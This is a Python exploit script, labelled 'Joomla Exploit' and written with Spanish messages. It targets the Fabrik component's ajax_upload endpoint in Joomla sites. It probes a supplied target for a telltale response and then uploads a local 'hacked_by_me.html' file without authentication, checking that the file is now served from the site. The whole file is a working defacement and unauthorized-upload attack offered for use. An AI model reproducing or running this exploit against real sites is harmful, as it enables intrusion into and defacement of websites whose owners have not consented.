#!/usr/bin/env python
#_*_ coding: utf8 _*_

import requests
import argparse
import sys
import urllib3
from os import path

urllib3.disable_warnings()
parser = argparse.ArgumentParser(description="Joomla Exploit")
parser.add_argument('-t','--target',help="Target")
argsv = parser.parse_args()

path_exploit = "index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload"
user_agent = {'User-Agent': 'Mozilla/4.0 (compatible; MSIE 8.0; Linux i686; en) Opera 10.51'}

def banner():
	print("""
   _____ _          _ _   _    _       _                 _ 
  / ____| |        | | | | |  | |     | |               | |
 | (___ | |__   ___| | | | |  | |_ __ | | ___   __ _  __| |
  \___ \| '_ \ / _ \ | | | |  | | '_ \| |/ _ \ / _` |/ _` |
  ____) | | | |  __/ | | | |__| | |_) | | (_) | (_| | (_| |
 |_____/|_| |_|\___|_|_|  \____/| .__/|_|\___/ \__,_|\__,_|
                                | |                        
                                |_|                        
\tFanpage: www.facebook.com/reldsec | www.reldsec.org
		""")

def repair_url_add(url):
    ur = list(url)
    if ur[-1] == '/':
        ur.pop()
    else:
        pass
    url = ''.join(ur)
    if url.startswith('http://') or url.startswith('https://'):
        pass
    else:
        url = "http://" + url

    return url

def verify(url):
	print('[+] Verficando si el sitio es vulnerable...')
	try:
		pet = requests.get(url + "/" + path_exploit, headers=user_agent)
		if '{"filepath":null,"uri":null}' in pet.text:
			print('[+] Sitio Vulnerable, subiendo index...')
		else:
			print('[x] El sitio no es vulnerable')
			sys.exit(1)
	except:
		print('[x] No pude conectarme al sitio')
		sys.exit(1)

def exploit(url):
	exploit_dir = url + "/" + path_exploit
	file='hacked_by_me.html'
	if path.exists(file):
		f = open(file)
	else:
		print('[x] No existe el archivo')
		sys.exit(1)
	try:
		r =  requests.post(url=exploit_dir, headers=user_agent, data={'title':'test_file'}, files={'file':f})
		print('[+] Archivo subido!')
		print('[-] Verificando...')
		try:
			verif = requests.get(url + "/" + file)
			if verif.status_code == 200:
				print('[+] Exploit completado! => {}'.format(url + "/" + file))
			else:
				print('[x] Exploit Fallido')
		except:
			print('[x] No pude verificar el archivo subido :(')	
			sys.exit(1)
	except:
		print('[x] No me pude conectar al sitio :(')
		sys.exit(1)

def main():
	banner()
	if argsv.target:
		url = repair_url_add(argsv.target)
		verify(url)
		exploit(url)
	else:
		print('[x] Necesito un objetivo')
if __name__ == '__main__':
	try:
		main()
	except KeyboardInterrupt:
		sys.exit(1)